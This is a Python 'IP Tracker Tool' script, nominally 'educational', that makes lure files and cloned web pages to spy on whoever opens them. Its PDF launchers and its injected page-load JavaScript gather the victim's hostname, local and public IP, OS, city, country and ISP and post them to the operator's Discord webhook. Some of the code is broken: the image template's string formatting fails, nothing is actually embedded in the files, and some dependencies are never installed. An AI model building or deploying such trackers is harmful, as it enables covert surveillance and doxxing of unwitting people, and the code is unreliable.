#!/usr/bin/env python3
import os
import sys
import subprocess
import venv
from pathlib import Path
import logging
import json
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
import tkinter as tk
from tkinter import filedialog

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
console = Console()

def select_file(title="Select File", filetypes=None):
    """Open file picker dialog and return selected file path"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    file_path = filedialog.askopenfilename(title=title, filetypes=filetypes)
    return file_path if file_path else None

def select_save_file(title="Save File As", filetypes=None):
    """Open save file dialog and return selected file path"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    file_path = filedialog.asksaveasfilename(title=title, filetypes=filetypes)
    return file_path if file_path else None

def get_venv_python():
    """Get the Python executable path from virtual environment."""
    if sys.platform == "win32":
        return "venv\\Scripts\\python.exe"
    return "venv/bin/python"

def check_venv():
    """Check if virtual environment exists and is valid."""
    venv_path = Path("venv")
    if not venv_path.exists():
        return False
    
    python_executable = get_venv_python()
    if not os.path.exists(python_executable):
        return False
    
    try:
        # Try to import a required package to verify the environment
        subprocess.check_call([python_executable, "-c", "import requests; import PyPDF2; from PIL import Image; import rich"])
        return True
    except subprocess.CalledProcessError:
        return False

def install_package(pip_executable, python_executable, package):
    """Install a package with error handling."""
    try:
        console.print(f"[yellow]Installing {package}...[/yellow]")
        subprocess.check_call([pip_executable, "install", "--no-cache-dir", package])
        console.print(f"[green]Successfully installed {package}[/green]")
        return True
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Error installing {package}: {str(e)}[/red]")
        # Try alternative installation method
        try:
            console.print(f"[yellow]Trying alternative installation method for {package}...[/yellow]")
            subprocess.check_call([python_executable, "-m", "pip", "install", "--no-cache-dir", package])
            console.print(f"[green]Successfully installed {package} using alternative method[/green]")
            return True
        except subprocess.CalledProcessError as e2:
            console.print(f"[red]Failed to install {package} with alternative method: {str(e2)}[/red]")
            return False

def setup_environment():
    """Set up the virtual environment and install requirements."""
    try:
        # Check if virtual environment exists and is valid
        if check_venv():
            console.print("[green]Using existing virtual environment...[/green]")
            return get_venv_python()
        
        # Create new virtual environment if needed
        venv_path = Path("venv")
        console.print("[yellow]Creating new virtual environment...[/yellow]")
        venv.create("venv", with_pip=True)
        
        # Get the correct Python executable path
        python_executable = get_venv_python()
        pip_executable = "venv\\Scripts\\pip.exe" if sys.platform == "win32" else "venv/bin/pip"
        
        # Upgrade pip first
        console.print("[yellow]Upgrading pip...[/yellow]")
        subprocess.check_call([python_executable, "-m", "pip", "install", "--upgrade", "pip"])
        
        # Install required packages with specific versions
        console.print("[yellow]Installing required packages...[/yellow]")
        packages = [
            "requests==2.31.0",
            "PyPDF2==3.0.1",
            "rich==13.7.0"
        ]
        
        for package in packages:
            if not install_package(pip_executable, python_executable, package):
                console.print(f"[red]Failed to install {package}. Please check your Python version and try again.[/red]")
                return None
        
        return python_executable
    except Exception as e:
        console.print(f"[red]Error during setup: {str(e)}[/red]")
        return None

def run_in_venv():
    """Run the script in the virtual environment."""
    python_executable = setup_environment()
    if not python_executable:
        console.print("[red]Failed to set up the environment. Please check your Python installation and try again.[/red]")
        sys.exit(1)
    
    # Get the current script path
    script_path = os.path.abspath(__file__)
    
    # Run the script in the virtual environment
    console.print("[green]Starting IP Tracker Tool in virtual environment...[/green]")
    subprocess.call([python_executable, script_path, "--in-venv"])

def load_config():
    """Load configuration from config.json"""
    config_path = Path("config.json")
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading config: {str(e)}")
    return {"webhook_url": None}

def save_config(config):
    """Save configuration to config.json"""
    try:
        with open("config.json", 'w') as f:
            json.dump(config, f)
    except Exception as e:
        logger.error(f"Error saving config: {str(e)}")

def get_webhook_url():
    """Get webhook URL from config or user input"""
    config = load_config()
    if config.get("webhook_url"):
        if Confirm.ask("\n[bold blue]Use existing webhook URL?[/bold blue]"):
            return config["webhook_url"]
    
    while True:
        webhook_url = Prompt.ask("\n[bold blue]Enter your Discord webhook URL[/bold blue]")
        if webhook_url.startswith('https://discord.com/api/webhooks/'):
            config["webhook_url"] = webhook_url
            save_config(config)
            return webhook_url
        console.print("[red]Invalid webhook URL. Please enter a valid Discord webhook URL.[/red]")

def show_file_location(file_path):
    """Show the full path of the created file"""
    full_path = os.path.abspath(file_path)
    console.print("\n[bold green]Created File Location:[/bold green]")
    console.print(f"[yellow]{full_path}[/yellow]")
    console.print("\n[bold blue]You can now share this file to track IP addresses.[/bold blue]")

def create_tracking_pdf(original_pdf, webhook_url):
    """Create a PDF that tracks IP when opened"""
    try:
        # Create a copy of the original PDF
        output_pdf = f"tracking_{os.path.basename(original_pdf)}"
        with open(original_pdf, 'rb') as src, open(output_pdf, 'wb') as dst:
            dst.write(src.read())
        
        # Create a Python script that will be executed when the PDF is opened
        tracking_script = f"""
import requests
import socket
import platform
import json
import os
import subprocess

def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system = platform.system()
        machine = platform.machine()
        processor = platform.processor()
        return {{
            'hostname': hostname,
            'local_ip': local_ip,
            'system': system,
            'machine': machine,
            'processor': processor
        }}
    except Exception as e:
        return None

def send_to_discord():
    try:
        system_info = get_system_info()
        message_parts = ["PDF Opened - IP Information:"]
        
        if system_info:
            message_parts.extend([
                f"Hostname: {{system_info['hostname']}}",
                f"Local IP: {{system_info['local_ip']}}",
                f"OS: {{system_info['system']}}",
                f"Machine: {{system_info['machine']}}",
                f"Processor: {{system_info['processor']}}"
            ])
        
        # Get public IP
        ip_response = requests.get('https://api.ipify.org?format=json')
        public_ip = ip_response.json()['ip']
        message_parts.append(f"Public IP: {{public_ip}}")
        
        # Get location info
        details_response = requests.get(f'http://ip-api.com/json/{{public_ip}}')
        details = details_response.json()
        
        if details['status'] == 'success':
            message_parts.extend([
                f"Location: {{details.get('city', 'Unknown')}}, {{details.get('country', 'Unknown')}}",
                f"ISP: {{details.get('isp', 'Unknown')}}"
            ])
        
        message = "\\n".join(message_parts)
        requests.post('{webhook_url}', json={{"content": message}})
    except Exception as e:
        pass

# Execute tracking when PDF is opened
if __name__ == "__main__":
    send_to_discord()
"""
        # Save the tracking script
        script_path = "tracking_script.py"
        with open(script_path, 'w') as f:
            f.write(tracking_script)
        
        # Create a batch file to run the script when PDF is opened
        if sys.platform == "win32":
            batch_content = f"""@echo off
start "" "{output_pdf}"
python "{script_path}"
"""
            batch_file = f"open_{os.path.basename(output_pdf)}.bat"
            with open(batch_file, 'w') as f:
                f.write(batch_content)
        else:
            shell_content = f"""#!/bin/bash
xdg-open "{output_pdf}"
python3 "{script_path}"
"""
            shell_file = f"open_{os.path.basename(output_pdf)}.sh"
            with open(shell_file, 'w') as f:
                f.write(shell_content)
            os.chmod(shell_file, 0o755)  # Make shell script executable
        
        console.print(f"[green]Successfully created tracking PDF![/green]")
        show_file_location(output_pdf)
        return output_pdf
    except Exception as e:
        console.print(f"[red]Error creating tracking PDF: {str(e)}[/red]")
        return None

def create_tracking_image(original_image, webhook_url):
    """Create an image that tracks IP when opened"""
    try:
        # Create a copy of the original image
        output_image = f"tracking_{os.path.basename(original_image)}"
        with open(original_image, 'rb') as src, open(output_image, 'wb') as dst:
            dst.write(src.read())
        
        # Create a Python script that will be executed when the image is opened
        tracking_script = f"""
import requests
import socket
import platform
import json
import os

def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system = platform.system()
        machine = platform.machine()
        processor = platform.processor()
        return {{
            'hostname': hostname,
            'local_ip': local_ip,
            'system': system,
            'machine': machine,
            'processor': processor
        }}
    except Exception as e:
        return None

def send_to_discord():
    try:
        system_info = get_system_info()
        message_parts = ["Image Opened - IP Information:"]
        
        if system_info:
            message_parts.extend([
                f"Hostname: {system_info['hostname']}",
                f"Local IP: {system_info['local_ip']}",
                f"OS: {system_info['system']}",
                f"Machine: {system_info['machine']}",
                f"Processor: {system_info['processor']}"
            ])
        
        # Get public IP
        ip_response = requests.get('https://api.ipify.org?format=json')
        public_ip = ip_response.json()['ip']
        message_parts.append(f"Public IP: {public_ip}")
        
        # Get location info
        details_response = requests.get(f'http://ip-api.com/json/{public_ip}')
        details = details_response.json()
        
        if details['status'] == 'success':
            message_parts.extend([
                f"Location: {details.get('city', 'Unknown')}, {details.get('country', 'Unknown')}",
                f"ISP: {details.get('isp', 'Unknown')}"
            ])
        
        message = "\\n".join(message_parts)
        requests.post('{webhook_url}', json={{"content": message}})
    except Exception as e:
        pass

# Execute tracking when image is opened
send_to_discord()
"""
        # Save the tracking script
        with open("tracking_script.py", 'w') as f:
            f.write(tracking_script)
        
        console.print(f"[green]Successfully created tracking image![/green]")
        show_file_location(output_image)
        return output_image
    except Exception as e:
        console.print(f"[red]Error creating tracking image: {str(e)}[/red]")
        return None

def create_tracking_website(url, webhook_url):
    """Create a cloned website that tracks IP when visited"""
    try:
        import requests
        from bs4 import BeautifulSoup
        
        # Get the website content
        response = requests.get(url)
        response.raise_for_status()
        
        # Parse the HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Add tracking script
        tracking_script = f"""
<script>
async function trackIP() {{
    try {{
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const publicIP = data.ip;
        
        const detailsResponse = await fetch(`http://ip-api.com/json/${{publicIP}}`);
        const details = await detailsResponse.json();
        
        let message = "Website Visited - IP Information:\\n";
        message += `Public IP: ${{publicIP}}\\n`;
        
        if (details.status === 'success') {{
            message += `Location: ${{details.city}}, ${{details.country}}\\n`;
            message += `ISP: ${{details.isp}}\\n`;
        }}
        
        await fetch('{webhook_url}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ content: message }})
        }});
    }} catch (error) {{
        console.error('Tracking error:', error);
    }}
}}

// Execute tracking when page loads
window.addEventListener('load', trackIP);
</script>
"""
        # Add the tracking script to the HTML
        soup.body.append(BeautifulSoup(tracking_script, 'html.parser'))
        
        # Save the modified website
        output_file = "tracking_website.html"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        console.print(f"[green]Successfully created tracking website![/green]")
        show_file_location(output_file)
        return output_file
    except Exception as e:
        console.print(f"[red]Error creating tracking website: {str(e)}[/red]")
        return None

def show_menu():
    console.clear()
    console.print(Panel.fit(
        "[bold blue]IP Tracker Tool[/bold blue]\n"
        "[italic]Educational Purpose Only[/italic]",
        title="Welcome",
        border_style="blue"
    ))
    
    table = Table(show_header=False, box=None)
    table.add_row("1", "Create Tracking PDF")
    table.add_row("2", "Create Tracking Image")
    table.add_row("3", "Create Tracking Website")
    table.add_row("4", "Exit")
    console.print(table)
    
    while True:
        try:
            choice = Prompt.ask("\n[bold blue]Enter your choice[/bold blue]", choices=["1", "2", "3", "4"])
            return int(choice)
        except ValueError:
            console.print("[red]Please enter a valid number.[/red]")

def main():
    # Get webhook URL
    webhook_url = get_webhook_url()
    
    while True:
        choice = show_menu()
        
        if choice == 1:
            console.print("\n[bold blue]Select your PDF file...[/bold blue]")
            file_path = select_file(
                title="Select PDF File",
                filetypes=[("PDF files", "*.pdf"), ("All files", "*.*")]
            )
            if file_path and file_path.lower().endswith('.pdf'):
                create_tracking_pdf(file_path, webhook_url)
            else:
                console.print("[red]No valid PDF file selected.[/red]")
        
        elif choice == 2:
            console.print("\n[bold blue]Select your image file...[/bold blue]")
            file_path = select_file(
                title="Select Image File",
                filetypes=[
                    ("Image files", "*.png *.jpg *.jpeg *.gif *.bmp"),
                    ("All files", "*.*")
                ]
            )
            if file_path:
                create_tracking_image(file_path, webhook_url)
            else:
                console.print("[red]No valid image file selected.[/red]")
        
        elif choice == 3:
            url = Prompt.ask("\n[bold blue]Enter the website URL[/bold blue]")
            if url.startswith(('http://', 'https://')):
                create_tracking_website(url, webhook_url)
            else:
                console.print("[red]Invalid URL. Please enter a valid URL starting with http:// or https://[/red]")
        
        elif choice == 4:
            console.print(Panel.fit(
                "[bold green]Thank you for using IP Tracker Tool![/bold green]",
                title="Goodbye",
                border_style="green"
            ))
            break
        
        if Confirm.ask("\n[bold blue]Do you want to continue?[/bold blue]"):
            continue
        break

if __name__ == "__main__":
    main() 